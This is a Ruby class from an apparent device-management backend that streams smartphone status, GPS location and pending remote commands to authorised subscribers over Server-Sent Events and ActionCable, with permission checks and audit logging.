# frozen_string_literal: true

module Mcp
  class McpStreaming
    CHANNEL_PREFIX = 'mcp:stream:'

    attr_reader :auth, :subscriptions

    def initialize(auth:)
      @auth = auth
      @subscriptions = {}
      @lock = Mutex.new
    end

    # Subscribe to real-time device events
    def subscribe(device_id:, event_types: %w[location command status])
      auth.authorize!('data:read')
      channel = stream_channel(device_id)
      subscription_id = SecureRandom.uuid

      @lock.synchronize { @subscriptions[subscription_id] = {
        device_id: device_id,
        event_types: event_types,
        channel: channel,
        created_at: Time.current
      } }

      auth.audit_log(action: 'stream_subscribe', resource: device_id, details: { event_types: event_types })
      { subscription_id: subscription_id, channel: channel, event_types: event_types }
    end

    # Unsubscribe from device events
    def unsubscribe(subscription_id:)
      sub = @lock.synchronize { @subscriptions.delete(subscription_id) }
      return { error: 'Subscription not found' } unless sub

      auth.audit_log(action: 'stream_unsubscribe', resource: sub[:device_id])
      { unsubscribed: true, subscription_id: subscription_id }
    end

    # Publish an event to subscribers (called internally)
    def self.publish(device_id:, event_type:, data:)
      return unless defined?(ActionCable)

      ActionCable.server.broadcast(
        stream_channel(device_id),
        { type: event_type, device_id: device_id, data: data, timestamp: Time.current.iso8601 }
      )
    end

    # Generate SSE stream for a device
    def sse_stream(device_id:, event_types: %w[location command status])
      auth.authorize!('data:read')

      Enumerator.new do |yielder|
        yielder << sse_event('connected', { device_id: device_id, event_types: event_types })

        max_iterations = 3600 # ~1 hour max with default heartbeat
        iterations = 0
        loop do
          break if (iterations += 1) > max_iterations
          device = Smartphone.find_by(device_id: device_id)
          break unless device

          if event_types.include?('status')
            yielder << sse_event('status', {
              device_id: device_id,
              online: device.last_activity_at.present? && device.last_activity_at > 5.minutes.ago,
              last_activity: device.last_activity_at&.iso8601,
              battery: device.apk_installation&.battery_level
            })
          end

          if event_types.include?('location')
            latest = device.geo_locations.order(created_at: :desc).first
            if latest
              yielder << sse_event('location', {
                device_id: device_id,
                latitude: latest.latitude,
                longitude: latest.longitude,
                recorded_at: latest.created_at.iso8601
              })
            end
          end

          if event_types.include?('command')
            recent = device.pending_commands.where('created_at > ?', McpConfig.stream_heartbeat.seconds.ago)
            recent.each do |cmd|
              yielder << sse_event('command', {
                device_id: device_id,
                request_id: cmd.request_id,
                command: cmd.command,
                status: cmd.status
              })
            end
          end

          sleep McpConfig.stream_heartbeat
          yielder << sse_event('heartbeat', { timestamp: Time.current.iso8601 })
        end
      end
    end

    # List active subscriptions
    def list_subscriptions
      @lock.synchronize { @subscriptions.dup }.map do |id, sub|
        { subscription_id: id, device_id: sub[:device_id], event_types: sub[:event_types], since: sub[:created_at].iso8601 }
      end
    end

    private

    def stream_channel(device_id)
      "#{CHANNEL_PREFIX}#{device_id}"
    end

    def self.stream_channel(device_id)
      "#{CHANNEL_PREFIX}#{device_id}"
    end

    def sse_event(event_type, data)
      "event: #{event_type}\ndata: #{data.to_json}\n\n"
    end
  end
end
